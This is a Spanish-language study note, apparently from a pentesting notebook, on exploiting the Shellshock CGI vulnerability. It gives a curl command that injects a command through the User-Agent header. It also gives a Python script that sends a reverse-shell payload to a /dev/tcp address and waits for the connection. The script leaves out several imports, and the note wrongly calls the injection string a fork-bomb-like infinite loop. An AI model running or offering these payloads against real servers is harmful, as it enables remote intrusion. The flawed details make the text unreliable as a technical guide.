> The Shellshock problem is an example of an arbitrary code execution (ACE) vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.

## De que se trata
- Es una vulnerabilidad que permite ejecutar codigo de forma remota
- Suele suceder en las rutas /cgi-bin/ con archivos dentro
- Puede ser un archivo pl,cgi,sh
- Los atacantes intentan inyectar un codigo similar al fork bomb
```
() { :; };
```
- Que es un bucle infinito, logrando que el servicio se cuelgue

```
curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.11.92:3128 -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```
- Podemos cambiar la ruta `/usr/bin/whoami` para ejecutar el comando que queramos
- Y debemos agregar `echo;` la cantidad de veces que sea necesario hasta que se ejecute el comando

## Script automatico
```python
import sys, threading

def def_handler(sig, frame):
	print("[!] Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://192.168.11.92/cgi-bin/status"
proxy = {'http':'http://192.168.11.92:3128'}
port = 443

def attack():
	r = requests.get(url, proxies=proxy, headers={"User-Agent": '() { :; }; echo; /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.11.45/443 0>&1"'})

if __name__=="__main__":
	
	try:
		threading.Thread(target=attack, args=()).start()
	except Exception as e:
		print("[!] Ocurrio un error: "+e)

	shell = listen(port, timeout=20).wait_for_connection() 
	
	if shell.socket is None:
		log.failure("[!] Ocurrio un error en la conexion")
		sys.exit(1) 
	
```